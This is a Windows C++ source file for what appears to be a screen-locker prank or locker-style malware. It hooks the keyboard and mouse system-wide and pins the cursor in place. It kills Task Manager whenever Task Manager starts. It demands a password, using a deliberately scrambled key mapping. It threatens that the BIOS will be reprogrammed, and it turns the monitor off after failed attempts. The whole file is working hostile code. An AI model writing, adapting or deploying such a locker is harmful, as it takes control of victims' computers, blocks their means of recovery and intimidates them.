
#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>

using std::string;

int screenWidth;
int screenHeight;
int frequency = 10;
int attempts = 4;
string realPSW = "PASSWORD";
string enteredPSW = "";

HHOOK mouseHook;
HHOOK keyboardHook;

string GetMSG() {
	switch (attempts) {
	case 3: return "THREE ATTEMPTS HAVE LEFT";
	case 2: return "TWO ATTEMPTS HAVE LEFT";
	case 1: return "ONE ATTEMPT HAS LEFT";
	case 0: return "ZERO ATTEMPTS HAVE LEFT";
	default: return "YOU FUCKED UP)";
	}
}

char GetCharFromVkCode(int vkCode) {
    switch (vkCode) {
		case 0x41: return 'H';
		case 0x42: return 'B';
		case 0x43: return 'C';
		case 0x44: return 'D';
		case 0x45: return 'E';
		case 0x46: return 'F';
		case 0x47: return 'G';
		case 0x48: return 'A';
		case 0x49: return 'I';
		case 0x4A: return 'J';
		case 0x4B: return 'K';
		case 0x4C: return 'L';
		case 0x4D: return 'M';
		case 0x4E: return 'N';
		case 0x4F: return 'S';
		case 0x50: return 'U';
		case 0x51: return 'Q';
		case 0x52: return 'R';
		case 0x53: return 'O';
		case 0x54: return 'T';
		case 0x55: return 'P';
		case 0x56: return 'V';
		case 0x57: return 'W';
		case 0x58: return 'X';
		case 0x59: return 'Y';
		case 0x5A: return 'Z';
		case 0x30: return '0';
		case 0x31: return '1';
		case 0x32: return '2';
		case 0x33: return '3';
		case 0x34: return '4';
		case 0x35: return '5';
		case 0x36: return '6';
		case 0x37: return '7';
		case 0x38: return '8';
		case 0x39: return '9';

		default: return '\0';
    }
}

bool CheckForInteligence(KBDLLHOOKSTRUCT* pKeyboardStruct) {
	if(pKeyboardStruct->vkCode == VK_DELETE
		|| pKeyboardStruct->vkCode == VK_DOWN
		|| pKeyboardStruct->vkCode == VK_UP
		|| pKeyboardStruct->vkCode == VK_LEFT
		|| pKeyboardStruct->vkCode == VK_RIGHT
		|| pKeyboardStruct->vkCode == VK_LMENU
		|| pKeyboardStruct->vkCode == VK_RMENU
		|| pKeyboardStruct->vkCode == VK_BACK
		|| pKeyboardStruct->vkCode == VK_CAPITAL
		|| pKeyboardStruct->vkCode == VK_LCONTROL
		|| pKeyboardStruct->vkCode == VK_RCONTROL
		|| pKeyboardStruct->vkCode == VK_LSHIFT
		|| pKeyboardStruct->vkCode == VK_RSHIFT
		|| pKeyboardStruct->vkCode == VK_TAB
		|| pKeyboardStruct->vkCode == VK_DOWN
		|| pKeyboardStruct->vkCode == VK_INSERT
		|| pKeyboardStruct->vkCode == VK_ESCAPE
		|| pKeyboardStruct->vkCode == VK_RWIN
		|| pKeyboardStruct->vkCode == VK_LWIN
		|| pKeyboardStruct->vkCode == VK_PRINT
		|| pKeyboardStruct->vkCode == VK_FINAL
		|| pKeyboardStruct->vkCode == VK_F1
		|| pKeyboardStruct->vkCode == VK_F2
		|| pKeyboardStruct->vkCode == VK_F3
		|| pKeyboardStruct->vkCode == VK_F4
		|| pKeyboardStruct->vkCode == VK_F5
		|| pKeyboardStruct->vkCode == VK_F6
		|| pKeyboardStruct->vkCode == VK_F7
		|| pKeyboardStruct->vkCode == VK_F8
		|| pKeyboardStruct->vkCode == VK_F9
		|| pKeyboardStruct->vkCode == VK_F10
		|| pKeyboardStruct->vkCode == VK_F11
		|| pKeyboardStruct->vkCode == VK_F12) {
		return true;
	}
	return false;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			KBDLLHOOKSTRUCT* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
			//std::cout << "Key code: " << pKeyboardStruct->vkCode << std::endl;
			if (CheckForInteligence(pKeyboardStruct)) {
				attempts--;
				std::cout << std::endl << std::endl;
				std::cout << "		ARE YOU TOO INTELLIGENT?" << std::endl;
				std::cout << "		DON'T PLAY WITH ME ANYMORE!" << std::endl;
				std::cout << "		OR YOU'LL REGRET IT!" << std::endl << std::endl;
				std::cout << std::endl << "         " + GetMSG();
				std::cout << std::endl << std::endl;
				std::cout << std::endl << "Password: ";
				return 1;
			}
			if (pKeyboardStruct->vkCode == VK_RETURN) {
				attempts--;
				if (attempts<=0) {
					//attempts expired
					SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
				}
				else {
					if (realPSW == enteredPSW) {
						std::cout << std::endl << "     SUCCESS !";
						Sleep(2000);
						exit(0);
					}
					else {
						std::cout << std::endl << std::endl;
						std::cout << std::endl << "     :(  PASSWORD INCORRECT";
						std::cout << std::endl << "         SOO, "+ GetMSG();
						std::cout << std::endl << "         AND YOU BIOS WILL BE REPROGRAMMED :)";
						std::cout << std::endl << std::endl;

						enteredPSW = "";
						std::cout << std::endl << "Password: ";
					}
				}
			}
			else {
				if ((pKeyboardStruct->vkCode >= 65 && pKeyboardStruct->vkCode) <= 90
					|| (pKeyboardStruct->vkCode >= 48 && pKeyboardStruct->vkCode <= 57)) {

					enteredPSW += GetCharFromVkCode(pKeyboardStruct->vkCode);
					std::cout << enteredPSW[enteredPSW.length() - 1];
				}
				else {
					return 1;
				}
			}
		}
	}

	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		MSLLHOOKSTRUCT* pMouseStruct = reinterpret_cast<MSLLHOOKSTRUCT*>(lParam);

		RECT rect;
		rect.left = 300;
		rect.top = 300;
		rect.right = 300;  
		rect.bottom = 300;  
		
		ClipCursor(&rect);
		//
		// 
		
		// 
		//SetCursorPos(200, 200);
		//std::cout << "X: " << pMouseStruct->pt.x << ", Y: " << pMouseStruct->pt.y << std::endl;
	}

	return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}

LRESULT CALLBACK WndProc1(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	switch (msg) {
	case WM_CREATE: {
		std::cout << "Password: ";
		//HDC desktop = GetDC(HWND_DESKTOP);
		//HDC window = GetDC(hWnd);
		//
		//BitBlt(window, 0, 0, screenWidth, screenHeight, desktop, 0, 0, SRCCOPY);
		//
		//ReleaseDC(hWnd, window);

		//ReleaseDC(HWND_DESKTOP, desktop);
		//
		SetTimer(hWnd, 0, frequency, 0);
		//
		//ShowWindow(hWnd, SW_SHOW);
		break;
	}
	case WM_PAINT: {
		ValidateRect(hWnd, 0);
		break;
	}
	case WM_TIMER: {
		HDC wndw = GetDC(hWnd);
		//
		int x = (rand() % 1920);
		int y = (rand() % 50);
		//
		int width = 1;
		//
		//BitBlt(GetDC(HWND_DESKTOP), x, y, width, 1080, GetDC(HWND_DESKTOP), x, 0, SRCCOPY);
		ReleaseDC(hWnd, wndw);
		break;
	}
	case WM_DESTROY: {
		KillTimer(hWnd, 0);
		PostQuitMessage(0);
		break;
	}
				   return 0;
	}
	return DefWindowProc(hWnd, msg, wParam, lParam);
}

void IsApplicationOpen(WCHAR* windowTitle) {
	HWND hWnd = FindWindow(NULL, windowTitle);
	if (hWnd != NULL) {
		std::cout << std::endl << "YES" << std::endl;
		PostMessage(hWnd, WM_CLOSE, 0, 0);
	}
}
HANDLE IsProcessRunning(const std::wstring& processName) {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return nullptr;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hSnapshot,  &pe32)) {
		CloseHandle(hSnapshot);
		return nullptr;
	}

	do {
		//std::cout << pe32.szExeFile << std::endl;
		if (processName.compare(pe32.szExeFile) == 0) {
			CloseHandle(hSnapshot);
			return OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
		}
	} while (Process32Next(hSnapshot, &pe32));

	CloseHandle(hSnapshot);
	return nullptr;
}

int APIENTRY main(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int showCmd) {
	std::wstring blockedProcessName = L"Taskmgr.exe";
	screenWidth = GetSystemMetrics(SM_CXSCREEN);
	screenHeight = GetSystemMetrics(SM_CYSCREEN);
	//std::cout << screenWidth << "    " << screenHeight;

	WNDCLASS wndClass = { 0, WndProc1, 0, 0, inst, 0, LoadCursorW(0, IDC_ARROW), 0, 0, L"MeltingScreen" };

	if (RegisterClass(&wndClass)) {
		HWND hWnd = CreateWindowExA(WS_EX_TOPMOST, "MeltingScreen", 0, WS_POPUP, 0, 0, 600, 600, HWND_DESKTOP, 0, inst, 0);
		mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0);
		keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
		if (hWnd) {
			srand(GetTickCount());
			MSG msg = { 0 };
			while (msg.message != WM_QUIT) {
				if (PeekMessage(&msg, 0, 0, 0, PM_REMOVE)) {
					//firstly it will open and then will close
					//WCHAR app[] = L"Диспетчер задач";
					//IsApplicationOpen(app);

					//it will close straight after process will be added
					HANDLE hProcess = IsProcessRunning(blockedProcessName);
					if (hProcess != nullptr) {
						//std::wcout << L"Found process " << blockedProcessName << ".  Closing..." << std::endl;
						if (TerminateProcess(hProcess, 0)) {
							//std::wcout << L"success." << std::endl;
						}
						else {
							//std::wcerr << L"error: " << GetLastError() << std::endl;
						}
						CloseHandle(hProcess);
					}

					TranslateMessage(&msg);
					DispatchMessage(&msg);
				}
			}
		}
	}
}
